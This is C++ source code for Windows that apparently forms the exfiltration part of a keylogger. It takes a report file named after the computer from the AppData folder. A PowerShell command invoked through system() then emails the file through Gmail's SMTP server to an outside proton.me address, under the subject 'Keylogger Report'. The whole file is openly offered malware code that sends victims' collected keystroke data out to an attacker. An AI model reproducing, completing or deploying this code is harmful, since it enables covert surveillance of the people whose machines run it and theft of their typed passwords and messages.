#include <windows.h>
#include <wincrypt.h>
#include <string>
#include <fstream>
#include <vector>
#include <shlobj.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")

std::string Base64Encode(const std::string& input) {
    DWORD encodedSize = 0;
    if (!CryptBinaryToStringA(
        reinterpret_cast<const BYTE*>(input.data()), 
        static_cast<DWORD>(input.size()),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        NULL,
        &encodedSize
    )) return "";

    std::string output;
    output.resize(encodedSize);
    if (!CryptBinaryToStringA(
        reinterpret_cast<const BYTE*>(input.data()), 
        static_cast<DWORD>(input.size()),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        &output[0],
        &encodedSize
    )) return "";

    output.resize(encodedSize - 1);
    return output;
}

void SendEmail(const std::string& attachmentPath) {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);

    std::string subject = "Keylogger Report from " + std::string(computerName);
    std::string boundary = "BOUNDARY_" + std::to_string(GetTickCount());
    std::string filename = attachmentPath.substr(attachmentPath.find_last_of("\\") + 1);

    // Read PDF content
    std::ifstream file(attachmentPath, std::ios::binary);
    if (!file) return;
    std::vector<char> buffer(std::istreambuf_iterator<char>(file), {});
    std::string pdfData(buffer.data(), buffer.size());

    // Build MIME message
    std::string body = 
        "From: \"Keylogger\" <your_email@gmail.com>\r\n"
        "To: \"Recipient\" <elonmasai02@proton.me>\r\n"
        "Subject: " + subject + "\r\n"
        "MIME-Version: 1.0\r\n"
        "Content-Type: multipart/mixed; boundary=\"" + boundary + "\"\r\n\r\n"
        
        "--" + boundary + "\r\n"
        "Content-Type: text/plain; charset=utf-8\r\n"
        "Content-Transfer-Encoding: 7bit\r\n\r\n"
        "Attached is the keylogger report\r\n\r\n"
        
        "--" + boundary + "\r\n"
        "Content-Type: application/pdf; name=\"" + filename + "\"\r\n"
        "Content-Transfer-Encoding: base64\r\n"
        "Content-Disposition: attachment; filename=\"" + filename + "\"\r\n\r\n" +
        Base64Encode(pdfData) + "\r\n\r\n"
        
        "--" + boundary + "--";

    // Build PowerShell command
    std::string psCommand = 
        "$smtpServer = 'smtp.gmail.com'\n"
        "$smtpPort = 587\n"
        "$username = 'your_email@gmail.com'\n"
        "$password = 'your_app_password'\n"
        "$securePass = ConvertTo-SecureString $password -AsPlainText -Force\n"
        "$credential = New-Object System.Management.Automation.PSCredential($username, $securePass)\n"
        "Send-MailMessage -From $username -To 'elonmasai02@proton.me' -Subject '" + subject + "'" +
        " -Body '" + body + "'" +
        " -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $credential -Encoding UTF8";

    // Execute PowerShell
    std::string fullCommand = "powershell -Command \"" + psCommand + "\"";
    system(fullCommand.c_str());
}

int main() {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD nameSize = sizeof(computerName);
    GetComputerNameA(computerName, &nameSize);
    
    std::string pdfPath = std::string(appDataPath) + "\\" + computerName + "_Report.pdf";
    SendEmail(pdfPath);
    
    return 0;
}